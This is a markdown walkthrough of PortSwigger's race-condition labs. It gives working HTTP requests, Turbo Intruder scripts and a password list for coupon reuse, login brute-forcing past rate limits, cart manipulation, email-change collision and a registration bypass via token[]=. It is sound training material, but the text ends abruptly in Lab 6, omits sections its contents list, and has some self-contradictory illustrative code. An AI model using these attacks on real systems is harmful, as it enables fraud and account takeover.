# Race Conditions - Complete PortSwigger Labs Guide

## Table of Contents
- [Overview](#overview)
- [Lab Summary Table](#lab-summary-table)
- [Race Condition Fundamentals](#race-condition-fundamentals)
- [Lab Walkthroughs](#lab-walkthroughs)
  - [Lab 1: Limit Overrun Race Conditions](#lab-1-limit-overrun-race-conditions)
  - [Lab 2: Bypassing Rate Limits via Race Conditions](#lab-2-bypassing-rate-limits-via-race-conditions)
  - [Lab 3: Multi-Endpoint Race Conditions](#lab-3-multi-endpoint-race-conditions)
  - [Lab 4: Single-Endpoint Race Conditions](#lab-4-single-endpoint-race-conditions)
  - [Lab 5: Partial Construction Race Conditions](#lab-5-partial-construction-race-conditions)
  - [Lab 6: Exploiting Time-Sensitive Vulnerabilities](#lab-6-exploiting-time-sensitive-vulnerabilities)
  - [Lab 7: Web Shell Upload via Race Condition](#lab-7-web-shell-upload-via-race-condition)
- [Attack Techniques](#attack-techniques)
- [Burp Suite Workflows](#burp-suite-workflows)
- [Common Mistakes & Troubleshooting](#common-mistakes--troubleshooting)
- [Prevention & Defense](#prevention--defense)
- [References & Resources](#references--resources)

---

## Overview

Race conditions are vulnerabilities that occur when web applications process concurrent requests without adequate safeguards, creating exploitable "race windows" between validation and state changes. These vulnerabilities are closely related to business logic flaws and can lead to:

- **Business logic bypass** - Exceeding purchase limits, applying discounts multiple times
- **Authentication bypass** - Rate limit circumvention, credential brute-forcing
- **Access control violations** - Privilege escalation, unauthorized resource access
- **Data integrity issues** - Account takeover, duplicate transactions
- **File upload bypass** - Malicious file execution before validation

This guide covers all 7 PortSwigger Web Security Academy Race Condition labs with complete exploitation walkthroughs, payloads, and techniques based on original research presented at Black Hat USA 2023.

**Prerequisites:**
- Burp Suite Professional 2023.9 or higher (recommended)
- Turbo Intruder extension from BApp Store (for advanced labs)
- Understanding of HTTP/1.1 and HTTP/2 protocols
- Basic knowledge of Python for Turbo Intruder scripts

---

## Lab Summary Table

| # | Lab Name | Difficulty | Attack Type | Time | Key Technique |
|---|----------|-----------|-------------|------|---------------|
| 1 | Limit overrun race conditions | Apprentice | Business Logic | 10 min | Discount code reuse |
| 2 | Bypassing rate limits via race conditions | Practitioner | Rate Limit Bypass | 15 min | Login brute-force |
| 3 | Multi-endpoint race conditions | Practitioner | Business Logic | 15 min | Cart manipulation |
| 4 | Single-endpoint race conditions | Practitioner | Account Takeover | 10 min | Email change collision |
| 5 | Partial construction race conditions | Expert | Registration Bypass | 20 min | Null token acceptance |
| 6 | Exploiting time-sensitive vulnerabilities | Expert | Password Reset | 15 min | Timestamp collision |
| 7 | Web shell upload via race condition | Practitioner | File Upload | 12 min | Validation bypass |

---

## Race Condition Fundamentals

### What are Race Conditions?

Race conditions occur when multiple code paths interact with identical data simultaneously without proper synchronization. The exploitable timeframe is termed the **race window** - potentially lasting only milliseconds between when data is checked and when it's used.

### Core Concepts

**TOCTOU (Time-of-Check to Time-of-Use):**
The fundamental pattern where validation and action are not atomic:
```
1. Check: Is discount code valid?
2. Use: Apply discount
3. Update: Mark code as used
```
Between steps 1 and 3, multiple requests can pass validation.

**Sub-States:**
Applications transition through temporary intermediate states during request processing. These states may have:
- Uninitialized variables (null values)
- Incomplete database records
- Partial validation checks
- Temporary permission grants

### Types of Race Conditions

#### 1. Limit Overrun Race Conditions
Exploit TOCTOU flaws to exceed imposed restrictions:
- Redeeming gift cards multiple times
- Applying discount codes repeatedly
- Withdrawing funds exceeding balance
- Bypassing rate limits
- Reusing single-use tokens

**Vulnerable Code Pattern:**
```python
# Check
if not coupon_used(session_id, code):
    # Race window here!
    apply_discount(session_id, code)
    mark_used(session_id, code)
```

#### 2. Multi-Endpoint Race Conditions
Targeting multiple endpoints simultaneously to exploit validation gaps:
- Adding items during payment processing
- Modifying orders during confirmation
- Changing shipping details during checkout

**Attack Flow:**
```
Request 1: POST /cart/checkout (slow validation)
Request 2: POST /cart (add expensive item)
Result: Item added after validation, before confirmation
```

#### 3. Single-Endpoint Race Conditions
Sending parallel requests with different parameters to one endpoint:
- Email change with mismatched recipients
- Password reset token mixing
- Profile updates with conflicting data

**Vulnerability:**
```python
# Request initiates async task
send_email_task(user_id, new_email)

# Later, task retrieves data
def send_email_task(user_id, email):
    # Race window: data might have changed!
    user = get_user(user_id)
    send_confirmation(user.email, email)
```

#### 4. Hidden Multi-Step Sequences
Individual requests trigger invisible internal workflows with exploitable sub-states:
- Multi-stage database operations
- Asynchronous task processing
- Event-driven workflows
- Microservice communication

#### 5. Partial Construction Race Conditions
Objects created across multiple operations leave windows where incomplete states exist:
- User accounts without initialized fields
- API keys before generation
- Permissions before assignment
- Null values bypassing validation

**Vulnerable Pattern:**
```python
# Step 1: Create user record
user = create_user(username, email)

# Step 2: Generate confirmation token (separate transaction)
token = generate_token(user.id)

# Race window: user exists but token is null
```

### The Race Window

The exploitable window exists between:
1. **Data Read** - Application checks current state
2. **Business Logic** - Processing based on that state
3. **Data Write** - Updating the state

**Factors Affecting Window Size:**
- Database transaction delays
- Network latency
- Processing complexity
- Lock acquisition time
- Async task queuing

### Detection Methodology

**Phase 1 - PREDICT:**
Identify security-critical endpoints where:
- Multiple requests could target same records
- Operations involve database state checks
- Single-use resources are consumed
- Rate limits are enforced
- Validation precedes action

**Phase 2 - PROBE:**
1. Benchmark normal behavior (sequential requests)
2. Send parallel requests
3. Look for deviations:
   - Different response codes
   - Different response lengths
   - Different response times
   - Different error messages
   - Multiple successes where one expected

**Phase 3 - PROVE:**
1. Isolate essential requests
2. Replicate effects consistently
3. Confirm exploitability
4. Demonstrate impact

---

## Lab Walkthroughs

### Lab 1: Limit Overrun Race Conditions

**Difficulty:** Apprentice
**Objective:** Purchase the "Lightweight L33t Leather Jacket" for less than your available credit by exploiting a race condition in the coupon system.

#### Understanding the Vulnerability

The shopping cart system stores state server-side keyed by session ID. When applying a discount code:
1. System checks if code was already used
2. Applies discount to cart
3. Updates database to mark code as used

The race window exists between steps 1 and 3 - multiple parallel requests can pass validation before the database reflects the code was used.

#### Solution Steps (Burp Professional)

**1. Initial Reconnaissance:**

```http
POST /cart HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1
```

Login with `wiener:peter` and explore the functionality:
- Add cheapest item to cart
- Apply discount code `PROMO20`
- Observe "Coupon already applied" when attempting reuse
- Note cart endpoints: `/cart`, `/cart/coupon`, `/cart/checkout`

**2. Benchmark Sequential Behavior:**

Send the coupon application request twice:

```http
POST /cart/coupon HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]&coupon=PROMO20
```

**Expected:**
- First request: Success
- Second request: "Coupon already applied"

**3. Exploit the Race Condition:**

In Burp Repeater:
1. Right-click the coupon request
2. Select "Create tab group"
3. Duplicate tab 19 times (20 total requests)
4. Ensure all have same session cookie
5. Right-click tab group → "Send group in parallel (single-packet attack)"

**Alternative (Manual):**
- Use "Trigger race condition" custom action
- Configure 20 parallel requests
- Execute attack

**4. Verify Exploitation:**

Check responses for multiple success messages:
```http
HTTP/2 200 OK
Content-Length: 3420

[HTML showing reduced price]
```

Refresh browser - cart total should show significant reduction (20% × number of successful requests).

**5. Purchase Target Item:**

```http
POST /cart HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1
```

Apply the leather jacket (productId=1), repeat the race condition attack on `/cart/coupon`, and checkout when price is below your credit.

#### Solution Steps (Burp Community Edition)

1. Create 19 duplicate tabs of coupon request
2. Use "Send group in parallel" (not sequential)
3. Monitor for multiple successful applications
4. Complete purchase when affordable

#### HTTP Request/Response Examples

**Successful Parallel Requests:**
```http
POST /cart/coupon HTTP/2
Host: 0a9f00e503e8f1f580f8e1ba00610086.web-security-academy.net
Cookie: session=vHdMuJ8YT7KzPqLm3Nxr9WcGsE2fVnBa
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=x8KmL3pQ9rYvN2jFwZnC7sVbG1hT6dXk&coupon=PROMO20
```

**Response (First 5 requests):**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3420

<!-- Cart shows: $1337.00 - $267.40 discount = $1069.60 -->
```

#### Key Technical Details

- **Session Keying:** Operations keyed on session ID create single collision point
- **Server-Side State:** Cart stored server-side enables consistent race window
- **HTTP/2 Single-Packet:** All requests sent in one TCP packet maximizes success
- **Retry Logic:** May need multiple attempts due to timing precision

#### Common Mistakes

- Using sequential instead of parallel requests
- Different session cookies across requests
- Missing CSRF tokens
- Not refreshing browser to see updated cart
- Attempting checkout before sufficient discount applied

---

### Lab 2: Bypassing Rate Limits via Race Conditions

**Difficulty:** Practitioner
**Objective:** Brute-force the password for user `carlos` by bypassing rate limiting, then access admin panel and delete the user.

#### Understanding the Vulnerability

The login mechanism enforces rate limiting after 3 incorrect attempts per username. However, the rate limit counter is updated after request processing, creating a race window. Parallel requests submitted simultaneously can bypass the counter increment.

**Vulnerable Logic:**
```python
def login(username, password):
    # Check counter
    if login_attempts[username] > 3:
        return "Too many attempts"

    # Race window here!
    if not verify_password(username, password):
        login_attempts[username] += 1
        return "Invalid credentials"

    return "Success"
```

#### Solution Steps

**Phase 1: Predict Potential Collision**

1. Test with your account (`wiener:wrongpass`)
2. Observe lockout after 3+ incorrect attempts
3. Try different username - note standard error message
4. **Key Finding:** Rate limiting is per-username, stored server-side
5. **Vulnerability Window:** Between submission and counter increment

**Phase 2: Benchmark Behavior**

Capture login request:
```http
POST /login HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

csrf=[TOKEN]&username=wiener&password=wrongpass
```

In Burp Repeater:
1. Send to Repeater and create tab group
2. Duplicate tab 19 times (20 total)
3. Send requests **sequentially** with separate connections
4. **Expected:** Lockout after ~3 attempts (working as designed)

**Phase 3: Probe for Clues**

1. Send same 20 requests in **parallel** instead of sequentially
2. Analyze responses for variation
3. **Discovery:** More than 3 requests receive "Invalid username or password"
4. **Conclusion:** Parallel submission bypasses rate limit

**Phase 4: Prove with Turbo Intruder**

**Setup:**
1. In Repeater, highlight password value
2. Right-click → Extensions → Turbo Intruder → Send to turbo intruder
3. Note `%s` placeholder marks password field
4. Change `username` to `carlos`
5. Select template: `examples/race-single-packet-attack.py`

**Python Configuration:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Passwords from clipboard
    passwords = wordlists.clipboard

    # Queue all requests with same gate
    for password in passwords:
        engine.queue(target.req, password, gate='1')

    # Release all requests simultaneously
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Execution:**
1. Copy candidate passwords to clipboard:
```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
```

2. Launch attack in Turbo Intruder
3. **Look for:** 302 redirect response (success)
4. Note password from Payload column

**Example Success:**
```http
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=NewSessionToken
Content-Length: 0
```

**Phase 5: Complete Attack**

1. Wait for account lock reset (if needed)
2. Log in as `carlos` with identified password
3. Navigate to `/admin`
4. Delete user `carlos`:

```http
GET /admin/delete?username=carlos HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[CARLOS-SESSION]
```

#### HTTP Request/Response Examples

**Turbo Intruder Request Template:**
```http
POST /login HTTP/2
Host: 0ac200a703bce0b38116b12f00d1007f.web-security-academy.net
Cookie: session=TempSessionForBruteforce
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

csrf=AoVmKJ9YFpRzL7nQ3sWxBgC8vT2dHjXk&username=carlos&password=%s
```

**Failed Attempt:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3142

<!DOCTYPE html>
<html>
    <body>
        <p class=is-warning>Invalid username or password.</p>
    </body>
</html>
```

**Successful Login:**
```http
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=kR9pL3mQ7wNxJ2vB5yC8fG1hT6zDsXn4
Content-Length: 0
```

#### Key Technical Details

- **HTTP/2 Single-Packet Attack:** Uses `engine=Engine.BURP2` with `concurrentConnections=1`
- **Gate Mechanism:** `gate='1'` withholds requests until `openGate('1')` called
- **Success Indicator:** 302 redirect differs from 200 error responses
- **Timing Critical:** Network jitter minimized by single TCP packet

#### Common Mistakes

- Using sequential requests (no race condition)
- Forgetting to copy passwords to clipboard first
- Not waiting for lock reset between attempts
- Using outdated Burp Suite version
- Missing Turbo Intruder extension

#### Troubleshooting

**Problem:** All requests show rate limit error
**Solution:** Ensure using parallel sending with single-packet attack

**Problem:** No 302 responses
**Solution:** Expand password list, ensure correct username

**Problem:** Can't login after finding password
**Solution:** Wait for rate limit cooldown period

---

### Lab 3: Multi-Endpoint Race Conditions

**Difficulty:** Practitioner
**Objective:** Purchase the "Lightweight L33t Leather Jacket" by exploiting a race condition between cart modification and checkout validation.

#### Understanding the Vulnerability

The checkout process validates cart contents and available credit in a single request/response cycle. However, there's a race window between when the order is validated and when it's confirmed. A second endpoint can modify the cart during this window.

**Vulnerable Flow:**
```
Thread 1: POST /cart/checkout
  ├─ Read cart contents
  ├─ Validate available credit
  ├─ [Race window here]
  └─ Confirm order

Thread 2: POST /cart (add expensive item)
  └─ Modifies cart during validation
```

#### Solution Steps

**Phase 1: Predict Potential Collision**

1. **Log in:** `wiener:peter`

2. **Study purchase flow:**
```http
POST /cart HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

productId=2&quantity=1
```

3. **Purchase gift card** to study flow without depleting credit

4. **Identify endpoints:**
   - `POST /cart` - Adds items
   - `POST /cart/checkout` - Submits orders
   - `GET /cart` - Retrieves cart state

5. **Test session dependency:**
```http
GET /cart HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
```

Response confirms server-side cart storage keyed by session.

**Phase 2: Benchmark the Behavior**

1. **Create Repeater tab group** with:
   - Request 1: `POST /cart/checkout`
   - Request 2: `POST /cart` (add leather jacket)

2. **Add connection warming:** Include `GET /` at start to reduce latency variance

3. **Test sequential sending** over single connection to measure timing

4. **Remove homepage request** after baseline

5. **Modify cart request:**
```http
POST /cart HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1
```

6. **Verify rejection:** Insufficient funds error expected

**Phase 3: Prove the Concept**

1. **Setup cart state:**
   - Remove leather jacket
   - Add gift card to cart

2. **Prepare requests:**
```http
# Request 1: Checkout (uses gift card price)
POST /cart/checkout HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]

# Request 2: Add expensive item during validation
POST /cart HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1
```

3. **Send in parallel** using Burp Repeater's parallel feature

4. **Analyze responses:**
   - 200 response = successful purchase
   - Insufficient funds = retry (timing-dependent)

5. **Verify:** Check order confirmation for leather jacket

#### HTTP Request/Response Examples

**Connection Warming Request:**
```http
GET / HTTP/2
Host: 0a5600a3032a4dc481771bbe005f00e4.web-security-academy.net
Cookie: session=[SESSION]
```

**Checkout Validation Request:**
```http
POST /cart/checkout HTTP/2
Host: 0a5600a3032a4dc481771bbe005f00e4.web-security-academy.net
Cookie: session=pK9mL2nQ8wVxJ3yB6zA7fH0gT5rDsXc1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

csrf=x9KmL4pQ2rYvN8jFwZnC5sVbG3hT7dXk
```

**Concurrent Cart Modification:**
```http
POST /cart HTTP/2
Host: 0a5600a3032a4dc481771bbe005f00e4.web-security-academy.net
Cookie: session=pK9mL2nQ8wVxJ3yB6zA7fH0gT5rDsXc1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

productId=1&quantity=1
```

**Success Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2847

<!DOCTYPE html>
<html>
    <body>
        <section class="notification is-success">
            <p>Congratulations, you bought: Lightweight L33t Leather Jacket!</p>
        </section>
    </body>
</html>
```

**Failure Response:**
```http
HTTP/2 400 Bad Request
Content-Type: text/html; charset=utf-8
Content-Length: 2654

<!DOCTYPE html>
<html>
    <body>
        <p class=is-warning>Not enough store credit for this purchase</p>
    </body>
</html>
```

#### Key Technical Details

- **Endpoint Alignment:** Different processing speeds require timing adjustment
- **Connection Warming:** Preliminary requests equalize server state
- **Session Locking:** Same session cookie enables collision
- **Retry Requirement:** Success depends on precise timing window

#### Advanced Techniques

**Connection Warming Purpose:**
```
First request: 850ms (cold connection)
After warming: 120ms (warm connection)
Result: Reduced variance in race window timing
```

**Rate Limiting Abuse:**
Can intentionally trigger rate limits to create server-side delays that align race windows:
```http
# Send 100 rapid requests to /api/endpoint
# Server processing slows down
# Race window becomes more predictable
```

#### Common Mistakes

- Not warming connections first
- Using different session cookies
- Wrong product IDs in cart request
- Giving up after first failure (requires multiple attempts)
- Sending requests sequentially

#### Troubleshooting

**Problem:** Always get insufficient funds
**Solution:** Retry attack multiple times; timing is critical

**Problem:** Cart shows wrong items
**Solution:** Clear cart completely before attempt

**Problem:** Session expired errors
**Solution:** Refresh session, update cookies in all requests

---

### Lab 4: Single-Endpoint Race Conditions

**Difficulty:** Practitioner
**Objective:** Exploit email change race condition to claim `carlos@ginandjuice.shop` and gain admin privileges.

#### Understanding the Vulnerability

The email change feature initiates an asynchronous task to send confirmation emails. The vulnerability exists because:
1. Request initiates task with new email address
2. Task queues for processing
3. Task retrieves user data from database
4. Confirmation email sent using retrieved data

**Race Window:** Between step 2 and 3, another request can modify the database, causing a mismatch between requested email and email in confirmation link.

**Vulnerable Code:**
```python
@app.route('/my-account/change-email', methods=['POST'])
def change_email():
    new_email = request.form['email']
    # Initiates async task
    send_confirmation_email.delay(user.id, new_email)
    return "Confirmation sent"

@celery.task
def send_confirmation_email(user_id, requested_email):
    # Race window: user data might have changed
    user = User.query.get(user_id)
    # Email template uses user.email (from database)
    # But confirmation is for requested_email
    token = generate_token(user_id, requested_email)
    send_email(user.email, token, requested_email)
```

#### Solution Steps

**Phase 1: Predict the Collision**

1. **Test email change functionality:**
```http
POST /my-account/change-email HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

email=test1@exploit-[ID].exploit-server.net
```

2. **Observe behavior:**
   - Confirmation email sent to new address
   - Subsequent requests invalidate previous confirmations
   - System only stores one pending email at a time

3. **Key Insight:** Database updates rather than appends, creating race window

**Phase 2: Benchmark Sequential Testing**

1. **Send request to Repeater** and create tab group

2. **Duplicate request 19 times**

3. **Modify each with unique email:**
```
test1@exploit-[ID].exploit-server.net
test2@exploit-[ID].exploit-server.net
test3@exploit-[ID].exploit-server.net
...
test20@exploit-[ID].exploit-server.net
```

4. **Send sequentially** over separate connections

5. **Confirm:** One confirmation email per request (expected behavior)

**Phase 3: Probe with Parallel Requests**

1. **Resend grouped requests in parallel**

2. **Check exploit server email client**

3. **Observe mismatches:**
   - Email sent to `test5@...` contains link for `test8@...`
   - Recipient addresses don't match confirmation addresses
   - Multiple emails show data from wrong requests

4. **Confirmation:** Race window between task init and data retrieval

**Phase 4: Prove the Concept**

1. **Create two-request group:**

```http
# Request 1: Throwaway email
POST /my-account/change-email HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

email=anything@exploit-[ID].exploit-server.net

# Request 2: Target admin email
POST /my-account/change-email HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
Content-Type: application/x-www-form-urlencoded

email=carlos@ginandjuice.shop
```

2. **Send both in parallel**

3. **Check exploit server inbox:**
   - Look for email to `anything@...`
   - Containing confirmation link with `carlos@ginandjuice.shop`

4. **Click confirmation link**

5. **Access admin panel:**
```http
GET /admin HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
```

6. **Delete carlos user:**
```http
GET /admin/delete?username=carlos HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION]
```

#### HTTP Request/Response Examples

**Email Change Requests:**
```http
POST /my-account/change-email HTTP/2
Host: 0a1f004f04c12b5f8002f3cf005c0012.web-security-academy.net
Cookie: session=vB8mL5nQ2wTxJ9yC3zA6fK0gR7pDsXh4
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

email=anything@exploit-0a9a00d204972b708078f20f01cc00ed.exploit-server.net
```

```http
POST /my-account/change-email HTTP/2
Host: 0a1f004f04c12b5f8002f3cf005c0012.web-security-academy.net
Cookie: session=vB8mL5nQ2wTxJ9yC3zA6fK0gR7pDsXh4
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

email=carlos@ginandjuice.shop
```

**Confirmation Email (Mismatched):**
```
From: noreply@ginandjuice.shop
To: anything@exploit-0a9a00d204972b708078f20f01cc00ed.exploit-server.net
Subject: Please confirm your email address

Hello,

Please click the link below to confirm your new email address:

https://0a1f004f04c12b5f8002f3cf005c0012.web-security-academy.net/confirm?token=AB6yxPqm9Z8jFwLnC7sVbK3hT2dRgXv5&email=carlos@ginandjuice.shop

Thank you!
```

**Successful Admin Access:**
```http
GET /admin HTTP/2
Host: 0a1f004f04c12b5f8002f3cf005c0012.web-security-academy.net
Cookie: session=vB8mL5nQ2wTxJ9yC3zA6fK0gR7pDsXh4

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3856

<!DOCTYPE html>
<html>
    <body>
        <div id=admin-panel>
            <h1>Admin panel</h1>
            <a href="/admin/delete?username=carlos">Delete carlos</a>
        </div>
    </body>
</html>
```

#### Key Technical Details

- **Asynchronous Processing:** Email sending queued for later execution
- **Database Race:** Task retrieves stale/modified data
- **Data Mismatch:** Email recipient ≠ confirmation address
- **Single Pending Email:** Only one confirmation active at a time

#### Common Mistakes

- Using same email address in both requests
- Not checking exploit server for confirmation
- Clicking wrong confirmation link
- Sending requests sequentially (no race)
- Missing session cookie in requests

#### Troubleshooting

**Problem:** No email mismatch observed
**Solution:** Increase number of parallel requests (try 10-20)

**Problem:** Confirmation link doesn't work
**Solution:** Must click link from email sent to throwaway address

**Problem:** Still no admin access after confirmation
**Solution:** Verify email parameter exactly matches `carlos@ginandjuice.shop`

---

### Lab 5: Partial Construction Race Conditions

**Difficulty:** Expert
**Objective:** Bypass email verification in user registration by exploiting null token validation during account creation race window.

#### Understanding the Vulnerability

User registration follows multi-step process:
1. Create user record in database
2. Generate confirmation token (separate transaction)
3. Store token in database
4. Send confirmation email

**Race Window:** Between steps 1 and 2, the user exists but the token field is null. If a confirmation request is sent during this window with an empty array parameter (`token[]=`), PHP type juggling causes null to match the empty array, bypassing verification.

**Vulnerable Code:**
```python
# Step 1: User creation
user = User.create(username=username, email=email)
db.commit()

# Step 2: Token generation (separate transaction)
# Race window: user.token is NULL here
token = generate_token()
user.token = token
db.commit()

# Confirmation endpoint
def confirm_registration(token):
    if user.token == token:  # null == [] in PHP
        user.confirmed = True
```

#### Solution Steps

**Phase 1: Reconnaissance**

1. **Understand registration requirements:**
   - Must use `@ginandjuice.shop` email
   - Email confirmation required
   - JavaScript reveals confirmation endpoint

2. **Examine client-side code:**
```http
GET /resources/static/users.js HTTP/2
Host: [LAB-ID].web-security-academy.net
```

```javascript
// Reveals confirmation endpoint
function confirmEmail(token) {
    fetch('/confirm?token=' + token, {
        method: 'POST'
    });
}
```

3. **Test confirmation behavior:**
```http
POST /confirm?token=invalid HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: phpsessionid=[SESSION]

Response: "Incorrect token: invalid"
```

```http
POST /confirm HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: phpsessionid=[SESSION]

Response: "Missing parameter: token"
```

```http
POST /confirm?token= HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: phpsessionid=[SESSION]

Response: 403 Forbidden
```

```http
POST /confirm?token[]= HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: phpsessionid=[SESSION]

Response: "Invalid token: Array"
```

4. **Key Insight:** Empty array response suggests null comparison vulnerability during registration

**Phase 2: Benchmark Testing**

1. **Test registration request:**
```http
POST /register HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=testuser&email=test@ginandjuice.shop&password=Password123!
```

2. **Test confirmation timing:**
```http
POST /confirm?token[]= HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: phpsessionid=[SESSION-ID]
Content-Length: 0
```

3. **Observe:** Confirmation responses arrive faster than registration responses, confirming race window exists

**Phase 3: Exploit Using Turbo Intruder**

**Configuration Steps:**

1. **Send registration request to Turbo Intruder**

2. **Mark username as payload position:**
```http
POST /register HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=%s&email=attacker@ginandjuice.shop&password=Password123!
```

3. **Ensure unique email** (not previously registered)

4. **Note static password** for later login

**Python Script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Confirmation request template
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a48007f04d53ff9826596fe00d300df.web-security-academy.net
Cookie: phpsessionid=nP3mK8jQ2wVxL9yB5zA7fR0gT6pDsXc4
Content-Length: 0

'''

    # Execute multiple attempts
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'attacker' + currentAttempt

        # Queue registration with unique gate
        engine.queue(target.req, username, gate=currentAttempt)

        # Queue 50 confirmation attempts for same gate
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)

        # Release all requests simultaneously
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

**Script Explanation:**
- **Gate System:** Each attempt uses unique gate for synchronization
- **Registration First:** Queued before confirmations
- **Multiple Confirmations:** 50 attempts maximize collision probability
- **Simultaneous Release:** Both request types released together
- **Session Cookie:** Must match registration session

**Execution:**

1. **Launch attack** in Turbo Intruder

2. **Sort results by response length**

3. **Identify success:**
```http
HTTP/2 200 OK
Content-Length: 2981

<!DOCTYPE html>
<html>
    <body>
        <p class="is-success">Account registration for user attacker7 successful!</p>
    </body>
</html>
```

4. **Note successful username** (e.g., `attacker7`)

**Phase 4: Account Takeover**

1. **Log in with created account:**
```http
POST /login HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=attacker7&password=Password123!
```

2. **Access admin panel:**
```http
GET /admin HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[NEW-SESSION]
```

3. **Delete carlos:**
```http
GET /admin/delete?username=carlos HTTP/2
Host: [LAB-ID].web-security-academy.net
Cookie: session=[NEW-SESSION]
```

#### HTTP Request/Response Examples

**Registration Request:**
```http
POST /register HTTP/2
Host: 0a48007f04d53ff9826596fe00d300df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

username=attacker7&email=attacker@ginandjuice.shop&password=Password123!
```

**Concurrent Confirmation Attempts:**
```http
POST /confirm?token[]= HTTP/2
Host: 0a48007f04d53ff9826596fe00d300df.web-security-academy.net
Cookie: phpsessionid=nP3mK8jQ2wVxL9yB5zA7fR0gT6pDsXc4
Content-Length: 0
```

**Success Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2981

<!DOCTYPE html>
<html>
    <head>
        <title>Account registration successful</title>
    </head>
    <body>
        <section>
            <p class="is-success">Account registration for user attacker7 successful! You are now logged in.</p>
        </section>
    </body>
</html>
```

**Failure Response (Token Already Set):**
```http
HTTP/2 403 Forbidden
Content-Type: text/html; charset=utf-8
Content-Length: 2756

<!DOCTYPE html>
<html>
    <body>
        <p class="is-warning">Incorrect token: Array</p>
    </body>
</html>
```

#### Key Technical Details

- **PHP Type Juggling:** `null == []` evaluates to true in loose comparison
- **Array Parameter Syntax:** `token[]=` creates empty array in PHP
- **Separate Transactions:** User creation and token generation not atomic
- **Timing Critical:** Multiple confirmation attempts needed to hit narrow window
- **Session Management:** Confirmation must use registration session cookie

#### Common Mistakes

- Reusing same username (triggers "already exists" error)
- Insufficient confirmation attempts (missing race window)
- Wrong session cookie in confirmation
- Not using array syntax `token[]=`
- Gate synchronization errors in script

#### Troubleshooting

**Problem:** No successful registrations
**Solution:** Increase confirmation attempts to 100 per registration

**Problem:** "Account already exists" errors
**Solution:** Use truly unique username for each attempt

**Problem:** Confirmation always fails
**Solution:** Verify session cookie matches registration session

**Problem:** Script errors
**Solution:** Ensure proper request termination with `\r\n\r\n`

---

### Lab 6: Exploiting Time-Sensitive Vulnerabilities

**Difficulty:** Expert
**Objective:** Exploit predictable password reset tokens based on timestamps to reset another user's password and access admin panel.

#### Understanding the Vulnerability

The password reset mechanism generates tokens using a predictable input - a timestamp. When two reset requests are processed at the exact same millisecond, they produce identical tokens for different users.

**Vulnerable Token Generation:**
```python
def generate_reset_token(username):
    # Timestamp is only entropy source
    timestamp = time.time()
    token = hashlib.sha256(f"{username}{timestamp}").hexdigest()
    return token

# If two requests execute at same timestamp:
# hash("wiener" + "1704067200000") != hash("carlos" + "1704067200000")
# BUT if timestamp changes between hash computation and username retrieval:
# Both end up using same timestamp value!
```

